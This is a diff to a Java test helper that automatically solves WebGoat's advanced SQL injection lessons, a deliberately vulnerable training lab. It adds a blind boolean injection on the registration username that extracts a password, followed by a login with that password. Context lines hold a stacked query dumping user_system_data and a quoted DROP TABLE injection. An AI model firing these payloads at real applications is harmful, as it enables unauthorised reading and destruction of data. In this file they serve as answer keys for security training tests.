@@ -11,6 +11,18 @@ public class SqlInjectionAdvanced_TestHelper extends TestHelper {
 		
 		Map<String, Object> params = new HashMap<>();
 		params.clear();
+		params.put("username_reg", "tom' AND substring(password,1,1)='t");	
+		params.put("password_reg", "password");	
+		params.put("email_reg", "someone@microsoft.com");	
+		params.put("confirm_password", "password");	
+		checkAssignmentWithPUT(cookie, webgoatURL+"/WebGoat/SqlInjectionAdvanced/challenge", params, true);
+		
+		params.clear();
+		params.put("username_login", "tom");	
+		params.put("password_login", "thisisasecretfortomonly");	
+		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjectionAdvanced/challenge_Login", params, true);
+				
+		params.clear();
 		params.put("userid_6a", "'; SELECT * FROM user_system_data;--");		
 		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjectionAdvanced/attack6a", params, true);
 	
@@ -30,7 +42,7 @@ public class SqlInjectionAdvanced_TestHelper extends TestHelper {
 		params.put("question_4_solution", "Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.");
 		checkAssignment(cookie, webgoatURL+"/WebGoat/SqlInjectionAdvanced/quiz", params, true);
 		
-		//checkResults(cookie, webgoatURL, "/SqlInjectionAdvanced/");
+		checkResults(cookie, webgoatURL, "/SqlInjectionAdvanced/");
 	
 	}
 }
